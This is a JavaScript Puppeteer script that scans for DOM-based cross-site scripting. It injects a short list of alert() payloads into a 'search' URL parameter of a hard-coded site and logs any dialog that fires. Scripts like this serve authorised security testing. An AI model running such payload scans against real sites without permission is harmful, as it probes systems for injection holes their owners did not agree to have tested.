const puppeteer = require('puppeteer');

// A list of common DOM XSS payloads targeting HTML sinks and sinks like innerHTML/eval
const payloads = [
    'javascript:alert(1)',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"`><script>alert(1)</script>',
    '${alert(1)}'
];

// The target base URL you want to audit (Make sure it is an in-scope asset)
const baseUrl = 'https://1w.run'; 

async function scanForDOMXSS() {
    console.log(`[+] Initializing Chromium Browser via Puppeteer...`);
    const browser = await puppeteer.launch({ headless: true });

    for (let payload of payloads) {
        const page = await browser.newPage();
        let xssDetected = false;

        // 1. Establish the Dialog Listener (Triggers if alert(), confirm(), or prompt() fires)
        page.on('dialog', async dialog => {
            if (dialog.message() || dialog.type() === 'alert') {
                console.log(`\n[🚨 XSS DETECTED!] Dialog popped up with message: "${dialog.message()}"`);
                console.log(`[🎯 Triggering Payload]: ${payload}`);
                xssDetected = true;
                await dialog.dismiss();
            }
        });

        // 2. Establish a Console Listener (Catches evaluation context errors or stack traces)
        page.on('console', msg => {
            if (msg.type() === 'error' && msg.text().includes('alert')) {
                console.log(`[⚠️ Console Warning]: Potential script execution blocked or logged: ${msg.text()}`);
            }
        });

        // 3. Construct the target URL with the payload injected into a common query parameter
        // (Change 'q', 'search', or 'id' depending on the input parameters found in F12)
        const targetUrl = `${baseUrl}?search=${encodeURIComponent(payload)}`;
        
        try {
            console.log(`[*] Testing parameter injection: ${targetUrl}`);
            
            // Navigate to the target page and wait until the frontend network traffic settles
            await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 10000 });
            
            // Give the browser client-side JavaScript an extra second to render sinks
            await new Promise(resolve => setTimeout(resolve, 1000));

        } catch (error) {
            console.log(`[-] Timeout or error loading page for payload: ${payload}`);
        } finally {
            await page.close();
        }
    }

    console.log(`\n[+] Scan Campaign Finished.`);
    await browser.close();
}

scanForDOMXSS();
